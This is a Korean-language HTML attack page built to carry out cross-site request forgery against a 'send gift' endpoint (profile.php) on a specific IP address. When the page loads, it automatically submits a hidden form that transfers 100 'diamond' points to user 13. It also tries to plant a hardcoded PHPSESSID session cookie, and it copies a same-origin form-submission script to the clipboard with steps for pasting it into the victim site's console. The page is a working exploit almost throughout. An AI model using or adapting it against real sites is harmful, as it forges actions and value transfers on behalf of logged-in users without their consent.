<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>🎯 정확한 CSRF 공격</title>
    <style>
        body { 
            font-family: Arial; 
            padding: 30px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
        }
        .attack-box {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 20px;
            margin: 20px auto;
            max-width: 600px;
        }
        button {
            background: #FF6B6B;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
        }
        .success { background: #00FF88; }
        .info-box {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="attack-box">
        <h1>🎯 헤더 분석 기반 CSRF 공격</h1>
        <p>실제 선물 보내기 요청을 정확히 복사합니다</p>
        
        <div class="info-box">
            <h3>📋 분석된 헤더 정보:</h3>
            <ul>
                <li><strong>Origin:</strong> http://3.36.66.216</li>
                <li><strong>Content-Type:</strong> application/x-www-form-urlencoded</li>
                <li><strong>Cookie:</strong> PHPSESSID 필요</li>
                <li><strong>Referer:</strong> 같은 도메인 필요</li>
            </ul>
        </div>
        
        <button onclick="executeBasicAttack()">🚀 기본 공격 시도</button>
        <button onclick="executeWithCookies()">🍪 쿠키 포함 공격</button>
        <button class="success" onclick="executeFromSameDomain()">🎯 Same-Domain 공격</button>
        
        <div id="result"></div>
    </div>

    <!-- 정확한 공격 Form -->
    <form id="preciseAttack" method="POST" action="http://3.36.66.216/profile.php" target="attackResult" style="display: none;">
        <input type="hidden" name="gift_to" value="13">
        <input type="hidden" name="points" value="100">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="gift_type" value="diamond">
        <input type="hidden" name="message" value="Precise_CSRF_Attack">
    </form>
    
    <iframe name="attackResult" style="display: none; width: 100%; height: 300px; margin-top: 20px;"></iframe>

    <script>
        function executeBasicAttack() {
            showResult('🚀 기본 CSRF 공격 실행...');
            document.getElementById('preciseAttack').submit();
            document.querySelector('iframe').style.display = 'block';
            
            setTimeout(() => {
                showResult('✅ 기본 공격 전송 완료!\niframe에서 응답 확인');
            }, 2000);
        }
        
        function executeWithCookies() {
            showResult('🍪 쿠키 설정 시도...');
            
            // 쿠키 설정 시도 (보통 실패하지만 시도)
            try {
                document.cookie = "PHPSESSID=jjbc5jd5vo82ofjcBg2605lv; domain=3.36.66.216; path=/";
                showResult('🍪 쿠키 설정 시도됨 (크로스 도메인 제한으로 실패 가능)');
            } catch(e) {
                showResult('❌ 쿠키 설정 실패: ' + e.message);
            }
            
            setTimeout(() => {
                executeBasicAttack();
            }, 1000);
        }
        
        function executeFromSameDomain() {
            showResult('🎯 Same-Domain 우회 시도...');
            
            // 실제 서버와 같은 도메인에서 실행하는 코드 생성
            const sameOriginCode = `
// 이 코드를 3.36.66.216 도메인의 콘솔에서 실행하세요:
(function() {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '/profile.php';
    form.style.display = 'none';
    
    const fields = {
        'gift_to': '13',
        'points': '100', 
        'send_gift': '1',
        'gift_type': 'diamond',
        'message': 'Same_Origin_CSRF'
    };
    
    Object.keys(fields).forEach(key => {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = fields[key];
        form.appendChild(input);
    });
    
    document.body.appendChild(form);
    form.submit();
    console.log('Same-Origin CSRF 공격 실행됨');
})();
            `;
            
            showResult(`
🎯 Same-Domain 공격 코드:

실제로 성공하려면:
1. http://3.36.66.216 사이트로 이동
2. 로그인 완료
3. F12 개발자도구 → Console 탭
4. 아래 코드 복사 & 실행

코드가 클립보드에 복사되었습니다!
            `);
            
            // 클립보드에 복사
            navigator.clipboard.writeText(sameOriginCode).then(() => {
                console.log('Same-Origin 공격 코드가 클립보드에 복사됨');
            });
            
            // 새 탭으로 대상 사이트 열기
            window.open('http://3.36.66.216', 'targetSite');
        }
        
        function showResult(text) {
            document.getElementById('result').innerHTML = 
                '<div class="info-box"><pre>' + text + '</pre></div>';
        }
        
        // 페이지 로드 시 자동으로 iframe 기반 공격 시도
        window.addEventListener('load', function() {
            console.log('🎯 정확한 헤더 정보 기반 CSRF 공격 준비됨');
            
            setTimeout(() => {
                showResult('⏰ 3초 후 자동 공격 시작...');
                
                setTimeout(() => {
                    executeBasicAttack();
                }, 3000);
            }, 1000);
        });
        
        // 실제 필드명 확인을 위한 디버깅
        console.log('📋 예상 POST 데이터:');
        console.log('gift_to=13&points=100&send_gift=1&gift_type=diamond&message=CSRF');
    </script>
</body>
</html>
